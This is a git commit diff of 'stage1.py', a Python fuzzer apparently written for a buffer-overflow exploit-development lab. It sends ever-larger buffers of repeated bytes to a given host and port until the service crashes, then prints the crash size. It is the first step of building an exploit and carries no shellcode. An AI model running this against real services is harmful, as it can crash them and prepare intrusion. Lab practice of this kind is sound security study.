983227c0cf86729b4761750f2998bf7647c5412b
n7ruzn <yeli.buonya@protonmail.com>
2021-07-07 21:55:57 -0400

    fixed description

--- stage1.py
+++ stage1.py
@@ -1,26 +1,45 @@
 #!/usr/bin/env python3
-import socket,sys
+# usage: ./stage1.py [ip] [port]
+import socket,sys,time
+from termcolor import colored, cprint
 
+# Handle Remote Host  
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
 
-# handle connection
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((RHOST, RPORT))
-
-# setup payload 
+# Handle Payload
 payload = "\x4E"
-payload_size = 150
+payload_size = 50 
 postfix = "\n"
+buff_size = 0
 
-buff = bytes(payload  * payload_size + postfix, encoding="ascii")
+while True:
+    try:
+        # Setup Payload
+        buff = bytes(payload * payload_size + postfix, encoding="ascii")
+        buff_size = len(buff) - len(postfix) 
 
-# payload status
-s.send(buff)
 
-print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff) - len(postfix)))
+        # Payload Status
+        print(colored("[+] - Sending Payload - [ {} Bytes ]".format(buff_size), "red"))
 
-# handle response
-response = s.recv(1024)
 
-print("Received: {}".format(response))
+        # Handle Connection
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((RHOST, RPORT))
+        response = s.recv(1024)
+        s.send(buff)
+        s.close()
+
+        
+        # Increment the Payload Size by 10 bytes
+        payload_size += 10
+        time.sleep(2)       
+    except:
+        # Once the applicaton breaks kill it
+        # on the exploit development WIN10 machine
+        # to display the message 
+        print(colored("[!] - Crash Detected  -> [ {} Bytes ]".format(buff_size), "green", attrs=["bold", "blink"]))
+        sys.exit(0)
+
+
